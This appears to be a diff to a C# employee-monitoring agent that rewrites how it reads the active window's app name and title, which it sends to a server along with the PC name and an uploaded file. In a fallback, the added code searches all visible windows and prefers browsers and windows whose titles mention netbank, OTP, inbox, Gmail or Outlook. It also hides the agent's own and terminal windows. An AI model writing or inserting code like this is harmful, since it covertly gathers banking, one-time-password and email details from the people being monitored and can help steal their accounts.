@@ -107,43 +107,166 @@ internal static class Program
         }
     }
 
-    private static string GetActiveWindowTitle()
+    private static (string AppName, string WindowTitle) GetActiveWindowMetadata()
     {
-        var handle = GetForegroundWindow();
-        if (handle == IntPtr.Zero)
+        var skipApps = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
         {
-            return "";
-        }
-        var sb = new System.Text.StringBuilder(256);
-        _ = GetWindowText(handle, sb, sb.Capacity);
-        return sb.ToString();
-    }
+            "powershell",
+            "pwsh",
+            "cmd",
+            "conhost",
+            "windowsterminal",
+            "employee_agent",
+            "workzillaagent",
+        };
+        var browserApps = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
+        {
+            "chrome",
+            "msedge",
+            "firefox",
+            "brave",
+            "opera",
+            "iexplore",
+            "safari",
+        };
+        for (var i = 0; i < 8; i++)
+        {
+            var handle = GetForegroundWindow();
+            if (handle == IntPtr.Zero)
+            {
+                Thread.Sleep(25);
+                continue;
+            }
+            var sb = new System.Text.StringBuilder(4096);
+            _ = GetWindowText(handle, sb, sb.Capacity);
+            var title = sb.ToString().Trim();
 
-    private static string GetActiveWindowAppName()
-    {
-        var handle = GetForegroundWindow();
-        if (handle == IntPtr.Zero)
-        {
-            return "";
+            _ = GetWindowThreadProcessId(handle, out var pid);
+            var appName = "";
+            if (pid > 0)
+            {
+                try
+                {
+                    using var process = Process.GetProcessById((int)pid);
+                    appName = (process.ProcessName ?? "").Trim();
+                }
+                catch
+                {
+                    appName = "";
+                }
+            }
+
+            if (!string.IsNullOrWhiteSpace(appName) && !skipApps.Contains(appName))
+            {
+                return (appName, title);
+            }
+            if (!string.IsNullOrWhiteSpace(title) &&
+                !title.Contains("powershell", StringComparison.OrdinalIgnoreCase) &&
+                !title.Contains("command prompt", StringComparison.OrdinalIgnoreCase) &&
+                !title.Contains("windows terminal", StringComparison.OrdinalIgnoreCase))
+            {
+                return (appName, title);
+            }
+            Thread.Sleep(25);
         }
-        _ = GetWindowThreadProcessId(handle, out var pid);
-        if (pid == 0)
+
+        // Fallback: foreground handle can be unavailable in some desktops/UAC states.
+        // In that case, pick topmost visible user window to avoid sending Monitor Active.
+        var candidates = new List<(string AppName, string WindowTitle)>();
+        _ = EnumWindows((hWnd, _) =>
         {
-            return "";
-        }
-        try
+            if (hWnd == IntPtr.Zero || !IsWindowVisible(hWnd) || IsIconic(hWnd))
+            {
+                return true;
+            }
+
+            var textLength = GetWindowTextLength(hWnd);
+            if (textLength <= 2)
+            {
+                return true;
+            }
+
+            var titleBuilder = new System.Text.StringBuilder(textLength + 1);
+            _ = GetWindowText(hWnd, titleBuilder, titleBuilder.Capacity);
+            var title = titleBuilder.ToString().Trim();
+            if (string.IsNullOrWhiteSpace(title))
+            {
+                return true;
+            }
+
+            _ = GetWindowThreadProcessId(hWnd, out var processId);
+            var candidateApp = "";
+            if (processId > 0)
+            {
+                try
+                {
+                    using var process = Process.GetProcessById((int)processId);
+                    candidateApp = (process.ProcessName ?? "").Trim();
+                }
+                catch
+                {
+                    candidateApp = "";
+                }
+            }
+
+            if (!string.IsNullOrWhiteSpace(candidateApp) && skipApps.Contains(candidateApp))
+            {
+                return true;
+            }
+
+            if (title.Contains("Work Zilla Agent", StringComparison.OrdinalIgnoreCase) ||
+                title.Contains("Monitor Active", StringComparison.OrdinalIgnoreCase))
+            {
+                return true;
+            }
+
+            candidates.Add((candidateApp, title));
+            // Keep collecting so we can prefer browser-like windows first.
+            return true;
+        }, IntPtr.Zero);
+
+        foreach (var candidate in candidates)
         {
-            using var process = Process.GetProcessById((int)pid);
-            return process.ProcessName ?? "";
+            if (!string.IsNullOrWhiteSpace(candidate.AppName) &&
+                browserApps.Contains(candidate.AppName))
+            {
+                return candidate;
+            }
+            if (candidate.WindowTitle.Contains("netbank", StringComparison.OrdinalIgnoreCase) ||
+                candidate.WindowTitle.Contains("otp", StringComparison.OrdinalIgnoreCase) ||
+                candidate.WindowTitle.Contains("inbox", StringComparison.OrdinalIgnoreCase) ||
+                candidate.WindowTitle.Contains("gmail", StringComparison.OrdinalIgnoreCase) ||
+                candidate.WindowTitle.Contains("outlook", StringComparison.OrdinalIgnoreCase))
+            {
+                return candidate;
+            }
         }
-        catch
+
+        if (candidates.Count > 0)
         {
-            return "";
+            return candidates[0];
         }
+        return ("", "");
     }
 
     [DllImport("user32.dll")]
     private static extern IntPtr GetForegroundWindow();
+
+    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+
+    [DllImport("user32.dll")]
+    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
+
+    [DllImport("user32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool IsWindowVisible(IntPtr hWnd);
+
+    [DllImport("user32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool IsIconic(IntPtr hWnd);
+
+    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    private static extern int GetWindowTextLength(IntPtr hWnd);
 
     [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
@@ -514,13 +637,14 @@ internal static class Program
         }
 
         var baseUrl = config.ServerUrl.TrimEnd('/');
+        var meta = GetActiveWindowMetadata();
         var payload = new Dictionary<string, object?>
         {
             ["company_key"] = config.CompanyKey,
             ["device_id"] = config.DeviceId,
             ["employee_id"] = state.EmployeeId,
-            ["app_name"] = GetActiveWindowAppName(),
-            ["window_title"] = GetActiveWindowTitle()
+            ["app_name"] = meta.AppName,
+            ["window_title"] = meta.WindowTitle
         };
         var content = new StringContent(JsonSerializer.Serialize(payload));
         content.Headers.ContentType = new MediaTypeHeaderValue("application/json");
@@ -561,8 +685,9 @@ internal static class Program
             }
             form.Add(new StringContent(config.CompanyKey), "company_key");
             form.Add(new StringContent(Environment.MachineName), "pc_name");
-            form.Add(new StringContent(GetActiveWindowAppName()), "app_name");
-            form.Add(new StringContent(GetActiveWindowTitle()), "window_title");
+            var meta = GetActiveWindowMetadata();
+            form.Add(new StringContent(meta.AppName), "app_name");
+            form.Add(new StringContent(meta.WindowTitle), "window_title");
 
             await using var fs = File.OpenRead(filePath);
             var fileContent = new StreamContent(fs);
